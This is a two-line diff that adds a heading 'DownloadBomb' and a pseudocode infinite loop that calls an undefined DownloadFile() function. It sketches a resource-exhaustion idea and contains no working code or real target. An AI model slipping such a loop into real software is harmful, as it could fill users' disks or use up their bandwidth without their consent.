@@ -1,0 +1,2 @@
+# DownloadBomb
+While(true) { DownloadFile() }
